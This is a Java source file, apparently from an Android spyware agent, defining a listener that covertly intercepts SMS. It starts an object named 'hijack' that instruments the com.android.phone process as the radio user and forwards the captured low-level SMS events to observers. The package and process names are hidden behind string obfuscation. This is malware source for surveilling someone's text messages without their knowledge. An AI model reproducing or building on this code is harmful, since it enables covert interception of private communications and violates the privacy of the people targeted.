package com.android.dvci.listener;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.interfaces.Observer;
import com.android.dvci.module.message.LowEventSms;
import com.android.dvci.util.Check;
import com.android.dvci.util.Instrument;
import com.android.dvci.util.LowEventMsg;
import com.android.mm.M;

/**
 * Created by zad on 27/02/15.
 */
public class LowEventSmsManager extends Listener<LowEventSms> implements Observer<LowEventMsg> {
	//
	private static final String TAG = "LowEventSmsManager";

	private volatile static LowEventSmsManager singleton;
	Instrument hijack =null;

	private LowEventSmsManager() {
		super();

	}

	/**
	 * Self.
	 *
	 * @return the status
	 */
	public static LowEventSmsManager self() {
		if (singleton == null) {
			synchronized (ListenerSms.class) {
				if (singleton == null) {
					singleton = new LowEventSmsManager();
				}
			}
		}
		return singleton;
	}

	@Override
	public void start() {
		LowEventHandlerManager.self().attach(this);
		if(hijack == null) {
			hijack = new Instrument(M.e("com.android.phone"), Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"), Status.self().semaphoreMediaserver, M.e("pa.data"), M.e("radio"));
			hijack.setInstrumentationSuccessDir( Status.getAppContext().getFilesDir().getAbsolutePath() + M.e("/m4/"),true);
			hijack.addArg(Status.getApkName());
		}
		hijack.start();
	}

	@Override
	public void stop() {
		hijack.stop();
		LowEventHandlerManager.self().detach(this);
	}
	@Override
	public synchronized boolean attach(Observer<LowEventSms> o) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " attach");//$NON-NLS-1$
		}
		return super.attach(o);
	}

	@Override
	public synchronized void detach(Observer<LowEventSms> o) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " dettach");//$NON-NLS-1$
		}
		super.detach(o);
	}


	@Override
	public int notification(LowEventMsg event) {
		if (event.data != null) {
			dispatch(new LowEventSms(event));
		}
		event.res = 1;
		return event.res;
	}
}
